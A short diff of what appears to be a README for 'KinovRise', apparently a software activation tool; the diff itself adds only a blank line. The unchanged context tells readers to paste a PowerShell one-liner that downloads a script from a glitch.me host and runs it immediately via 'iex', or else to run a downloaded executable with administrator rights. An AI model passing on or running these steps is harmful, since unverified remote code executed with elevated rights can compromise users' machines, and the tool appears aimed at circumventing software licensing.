@@ -17,6 +17,7 @@
 ```
 irm "https://kra-activated.glitch.me/kinovrise.ps1" | iex
 ```
+
 ### Use KinovRise.exe
 
 If you cannot do method 1 as above, then we come to method 2: use KinovRise.exe, download it from the Release section, then run with administrator rights and activate as usual.
